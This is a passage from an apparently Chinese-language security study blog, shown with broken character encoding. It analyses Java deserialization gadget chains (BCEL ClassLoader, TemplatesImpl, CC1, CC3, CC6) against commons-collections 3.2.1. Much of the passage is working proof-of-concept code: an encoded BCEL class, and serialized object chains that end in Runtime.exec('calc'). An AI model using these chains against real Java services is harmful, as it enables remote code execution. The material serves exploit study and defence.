class="hljs-number">95</span>$ded$c8Vk$a7$M$ceVr$$$ZJ$a1$8a$e5A$f7$ba$v$d3$T$de$8cH$v$<span class="hljs-number">87</span>$<span class="hljs-number">89</span>$e0$d1$vO$<span class="hljs-number">95</span>$<span class="hljs-number">89</span>$3fEG_$a8$O1$c2$z$k$89u$GoCD$9f8F$e9Jx$c9ox$<span class="hljs-number">5d</span>$r$f5$dd$c3$ed$5b$n$dbZ$r1$<span class="hljs-number">95</span>$V$h$9a$8b$ab$<span class="hljs-number">7d</span>$de$b6$Y$da$<span class="hljs-number">88</span>$c1o$q$ddT$c8$je$b0$F$<span class="hljs-number">83</span>$5b5$bd$B$K$f0$<span class="hljs-number">5d</span>$cc$E$<span class="hljs-number">98</span>$c5$i$cd$a3$VD$80y$y0$M$fc$c3$O$b0$I$df$iAe$M$<span class="hljs-number">7d</span>$b6$o$e2q$ab$7e$d8$bc$94B3$f4$ffH$c7$ddX$abk$9a$e6$b7$a4$fe$O$w$d5Z$f8$a7$86Vv$e4$ad$q$e4r$f5W$b6$a1S$V$b7$d6$7f7$i$a5$<span class="hljs-number">89</span>$<span class="hljs-number">90</span>$<span class="hljs-number">9d</span>$O5$<span class="hljs-number">94</span>$da$<span class="hljs-number">94</span>$d4$f6$d0$<span class="hljs-number">93</span>$<span class="hljs-number">94</span>$LI$H$b8$f43$cc$<span class="hljs-number">93</span>$B3g$<span class="hljs-number">91</span>$ed$a1$a8N$9e$<span class="hljs-number">91</span>$cf$ad$3c$<span class="hljs-number">82</span>$dd$dbt$406o$c5$y$8ad$<span class="hljs-number">83</span>$<span class="hljs-number">8f</span>$C$f4$a2D$deC$dfw3$b70$a0$fc$84L9$fb$A$e7$ec$O$de$de$ca$D$f2$f7V$_Po$8e$u$868D_$<span class="hljs-number">86</span>$5b$b0$aaKd$P$fdD$fa$9aP$84Cq$<span class="hljs-number">99</span>$a2$Bz$5ddB$X$<span class="hljs-number">83</span>$O$r$wv$a9$a1w$m$c7$fd$faV$C$A$A<br></code></pre></td></tr></table></figure><blockquote><p>BCEL è¿™ä¸ªåŒ…ä¸­æœ‰ä¸ªæœ‰è¶£çš„ç±»<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>ï¼Œä»–æ˜¯ä¸€ä¸ª ClassLoaderï¼Œä½†æ˜¯ä»–é‡å†™äº† Java å†…ç½®çš„<code>ClassLoader#loadClass()</code>æ–¹æ³•ã€‚</p><p>åœ¨ <code>ClassLoader#loadClass()</code> ä¸­ï¼Œå…¶ä¼šåˆ¤æ–­ç±»åæ˜¯å¦æ˜¯ <code>$$BCEL$$</code> å¼€å¤´ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°†ä¼šå¯¹è¿™ä¸ªå­—ç¬¦ä¸²è¿›è¡Œ decode</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELRCE</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>().loadClass(<span class="hljs-string">&quot;$$BCEL$$&quot;</span> + <span class="hljs-string">&quot;$l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5$e5$40$_$dc$40$5c$QH$88$b0$88$o8O$87Q$Z$II$95N$Ro$c4$99$L$m$O$3c$A$P$85$f0$M$ab$E$91b$c7$bf$ed$cf$b6$f2$fa$f6$fc$C$60$NK$3e$3c$M$fb$Y$c1$a8$871$e3$c7$5dL$f8$c8a$d2$c5$94$8bi$86$fc$86$8a$95$ded$c8Vk$a7$M$ceVr$$$ZJ$a1$8a$e5A$f7$ba$v$d3$T$de$8cH$v$87$89$e0$d1$vO$95$89$3fEG_$a8$O1$c2$z$k$89u$GoCD$9f8F$e9Jx$c9ox$5d$r$f5$dd$c3$ed$5b$n$dbZ$r1$95$V$h$9a$8b$ab$7d$de$b6$Y$da$88$c1o$q$ddT$c8$je$b0$F$83$5b5$bd$B$K$f0$5d$cc$E$98$c5$i$cd$a3$VD$80y$y0$M$fc$c3$O$b0$I$df$iAe$M$7d$b6$o$e2q$ab$7e$d8$bc$94B3$f4$ffH$c7$ddX$abk$9a$e6$b7$a4$fe$O$w$d5Z$f8$a7$86Vv$e4$ad$q$e4r$f5W$b6$a1S$V$b7$d6$7f7$i$a5$89$90$9d$O5$94$da$94$d4$f6$d0$93$94$LI$H$b8$f43$cc$93$B3g$91$ed$a1$a8N$9e$91$cf$ad$3c$82$dd$dbt$406o$c5$y$8ad$83$8f$C$f4$a2D$deC$dfw3$b70$a0$fc$84L9$fb$A$e7$ec$O$de$de$ca$D$f2$f7V$_Po$8e$u$868D_$86$5b$b0$aaKd$P$fdD$fa$9aP$84Cq$99$a2$Bz$5ddB$X$83$O$r$wv$a9$a1w$m$c7$fd$faV$C$A$A&quot;</span>).newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706693.png"></p><h1 id="CC3-é“¾åˆ†æ"><a href="#CC3-é“¾åˆ†æ" class="headerlink" title="CC3 é“¾åˆ†æ"></a>CC3 é“¾åˆ†æ</h1><h2 id="ç¯å¢ƒï¼š"><a href="#ç¯å¢ƒï¼š" class="headerlink" title="ç¯å¢ƒï¼š"></a>ç¯å¢ƒï¼š</h2><p>JDK ï¼š8u65</p><p><font style="color:#080808;background-color:#ffffff;">commons-collections 3.2.1</font></p><p><font style="color:#080808;background-color:#ffffff;"></font></p><h2 id="åˆ†æé“¾"><a href="#åˆ†æé“¾" class="headerlink" title="åˆ†æé“¾"></a>åˆ†æé“¾</h2><p>CC3 åˆ©ç”¨çš„å°±æ˜¯ä¸Šæ–‡åˆ†æçš„ â€åˆ©ç”¨ TemplatesImpl åŠ è½½å­—èŠ‚ç â€œè¿™æ¡é“¾ï¼Œç„¶åç»“åˆ CC1&#x2F;CC6 çš„å‰åŠéƒ¨åˆ†å½¢æˆå¯ç”¨ POCã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706437.png"></p><h3 id="TemplatesImpl-é“¾ï¼š"><a href="#TemplatesImpl-é“¾ï¼š" class="headerlink" title="TemplatesImpl é“¾ï¼š"></a>TemplatesImpl é“¾ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>  <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>&#123;<br>    <span class="hljs-keyword">static</span>  &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTemplateImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryFiled.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        templates.newTransformer();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CC1-CC3-ï¼ˆInvokerTransformerï¼‰"><a href="#CC1-CC3-ï¼ˆInvokerTransformerï¼‰" class="headerlink" title="CC1 + CC3 ï¼ˆInvokerTransformerï¼‰"></a>CC1 + CC3 ï¼ˆ<strong><font style="color:rgb(44, 62, 80);">InvokerTransformerï¼‰</font></strong></h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706301.png"></p><h4 id="CC1ï¼š"><a href="#CC1ï¼š" class="headerlink" title="CC1ï¼š"></a>CC1ï¼š</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(Runtime.class);</span><br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span> , chainedTransformer);<br><br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br><br><br><br></code></pre></td></tr></table></figure><p>ç»“åˆä¸€ä¸‹å•Šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryFiled.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>),<br><br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(1);</span><br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span> , chainedTransformer);<br><br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706042.png"></p><h4 id="CC6ï¼š"><a href="#CC6ï¼š" class="headerlink" title="CC6ï¼š"></a>CC6ï¼š</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6Test02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span 